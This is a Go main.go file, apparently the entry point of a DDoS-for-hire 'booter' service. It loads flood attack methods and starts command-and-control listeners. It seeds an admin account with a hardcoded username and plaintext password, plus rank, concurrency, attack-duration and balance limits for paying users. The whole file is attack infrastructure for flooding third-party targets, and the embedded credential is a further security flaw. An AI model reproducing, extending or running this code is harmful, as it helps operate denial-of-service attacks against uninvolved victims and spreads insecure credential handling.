package main

import (
	"api/core"
	"api/core/database"
	"api/core/database/site"
	"api/core/database/users"
	"api/core/database/atks"
	"api/core/master"
	"api/core/models/log"
	"api/core/models/functions"
	"api/core/models/ranks"
	"api/core/models/servers"
	"api/core/net"
	"api/core/net/commands"
	"time"
)


func main() {
	core.Initialize()
	if err := database.New(); err != nil {
		log.Println("failed to initialize database", err)
		return
	}
	if err := site.Container.LoadSiteSettings(); err != nil {
		log.Println("failed to load site settings", err)
		return
	}
	if err := atks.Container.LoadFloodMethods(); err != nil {
		log.Printf("couldnt load flood methods: %v", err)
		return
	}
	// Adding basic rank
	log.Printf("Adding basic rank: %v", ranks.Internal["basic"])
	users.Container.NewUser(&database.User{
		ID:         0,
		Username:   "FileGone",
		Key:        []byte("130523Rs!"),
		Membership: "admin",
		Ranks: []*ranks.Rank{
			ranks.GetRole("admin", true),
			ranks.GetRole("vip", true),
			ranks.GetRole("api", true),
			ranks.GetRole("cnc", true),
		},
		Concurrents: 10,
		Duration:    200,
		Servers:     10,
		Balance:     1000,
		Expiry:      time.Now().Add(31 * 24 * time.Hour).Unix(),
		Tele: 		 1505914939,
	})

	if site.Site.CNC {
		go servers.Listen() 
		go net.Listener()   
		go commands.Init()  
		go func() {
			for {
				master.NewV2()
			}
		}()
	} else {
		log.Printf("[main] %s main.go CnC Turned Off!\n", time.Now().Format("15:04:05"))
		go servers.Listen()  
		go func() {
			for {
				master.NewV2()
			}
		}()
	}
	functions.CommandListener()

	select {}
}
